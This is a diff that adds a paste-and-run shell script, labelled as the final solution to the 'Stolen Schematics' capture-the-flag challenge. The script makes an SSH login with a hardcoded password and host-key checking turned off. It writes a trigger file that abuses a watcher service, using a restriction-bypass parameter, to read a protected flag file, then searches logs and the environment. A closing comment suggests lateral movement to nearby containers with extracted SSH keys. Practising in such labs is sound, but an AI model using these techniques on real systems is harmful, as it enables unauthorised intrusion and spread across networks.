@@ -1,0 +1,42 @@
+################################################################################
+# STOLEN SCHEMATICS - FINAL SOLUTION (350 PTS)
+# PASTE THIS ENTIRE COMMAND INTO YOUR KALI TERMINAL
+################################################################################
+
+sshpass -p "reyalp" ssh -o StrictHostKeyChecking=no -p 32887 player@instance.ctf.tdho.st << 'EOF'
+
+echo "=== STOLEN SCHEMATICS - EXPLOITING WATCHER.SH ==="
+echo ""
+
+# The watcher.sh monitors /opt/mc/.sync/sync.trigger
+# Command: FILE-READ:/etc/flag.txt prints flag to /opt/mc/sync.log
+# Parameter: talldwarf-remove-cmd-sync-restrictions__DEPRECATED__=true bypasses restrictions
+
+echo "[*] Creating trigger file with FILE-READ command..."
+mkdir -p /opt/mc/.sync 2>/dev/null
+echo "FILE-READ:/etc/flag.txt?talldwarf-remove-cmd-sync-restrictions__DEPRECATED__=true" > /opt/mc/.sync/sync.trigger
+
+echo "[*] Waiting for watcher.sh to process the trigger..."
+sleep 3
+
+echo "[*] Reading the flag from sync.log..."
+cat /opt/mc/sync.log 2>/dev/null | grep -i "TDHT{" || echo "Flag not found in sync.log yet"
+
+echo ""
+echo "[*] Alternative: Try different paths..."
+cat /opt/mc/logs/sync.log 2>/dev/null | grep -i "TDHT{" || true
+cat /opt/mc/watcher.log 2>/dev/null | grep -i "TDHT{" || true
+find /opt/mc -name "*.log" -type f 2>/dev/null | xargs grep -i "TDHT{" 2>/dev/null || true
+
+echo ""
+echo "[*] Alternative: Check if flag is in environment or another location..."
+find / -name "flag.txt" -type f 2>/dev/null | head -10
+env | grep -i flag || true
+
+exit
+EOF
+
+################################################################################
+# If the above doesn't work, the flag might need to be accessed from another 
+# container on the 172.27.0.x network using the extracted SSH keys
+################################################################################
